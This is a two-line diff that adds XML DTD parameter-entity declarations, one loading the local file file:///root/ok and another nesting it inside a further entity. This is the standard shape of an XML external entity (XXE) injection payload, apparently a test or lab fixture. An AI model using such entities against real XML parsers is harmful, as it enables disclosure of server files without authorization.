@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM "file:///root/ok">
+<!ENTITY % param1 "<!ENTITY &#37;orientation '%payload;'>">
